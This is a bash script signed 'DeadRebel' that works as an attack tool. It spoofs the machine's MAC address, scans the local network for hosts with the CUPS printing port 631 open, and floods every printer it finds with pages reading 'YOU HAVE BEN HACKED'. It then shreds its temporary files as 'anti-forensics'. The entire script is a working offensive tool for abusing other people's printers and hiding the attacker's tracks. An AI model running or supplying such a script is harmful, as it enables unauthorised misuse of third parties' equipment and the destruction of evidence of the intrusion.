#!/bin/bash
#By: DeadRebel
spoof(){
    ifconfig eth0 down;
    ifconfig eth0 hw ether $mcfodeo;
    ifconfig eth0 up; 
    sleep 1; 
} 
scan(){
    YO=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2)
    nmap -p 631 $YO/24 | grep open -B 3 | grep report | cut -d ' ' -f 5 | tr ' ' '\n' > tempT;
    TOTAL=$(wc -l tempT | cut -f 1 -d ' ' )
}
exploit(){
    figlet "YOU HAVE BEN HACKED" > temp;
    for (( l=0; l < $pages; l++ )) ; do
	    for i in $(cat tempT); do
		    lp -h $i:631 temp 
		    sleep 2 #To protect the printer buffer, or just sleep, u know, scripts need this. 
	    done
    done
}
forensic(){
    shred -z  temp;
    shred -z  tempT;
    rm -f temp tempT;
}
if [ $(id -u ) != 0 ];then
	echo "You need to run with root";
	exit;
fi
echo "Alright, lets do that shit";
echo "[*] Want Spoof your mac?[y/n]"
read spof
if [ $spof = 'y' ];then
	echo "Give to me the MAC you want:";
	echo "Blank for default:(53:F0:D3:07:10:00)";
	read mcfodeo
	if [ -z $mcfodeo ];then
	mcfodeo=00:53:f0:d3:07:10;	 
	fi
	echo "[*] Spoofing";
	spoof
	echo "[*] Done";
else echo "Really bad Ass uh";
fi
echo "[*] Searching for targets";
scan
echo "[*] Number of Targets found: $TOTAL";
echo "[+] Exploit?[y/n]";
read opt
if [ $opt = 'y' ];then 
    echo "How Many pages for printer:";
    read pages;
    echo "[*] Exploiting";
    exploit
    echo "[*] Done";
    echo "[*] Starting Anti-Forensics";
    forensic
    echo "[*] Done";
    echo "[*] Enjoy, bye";
fi

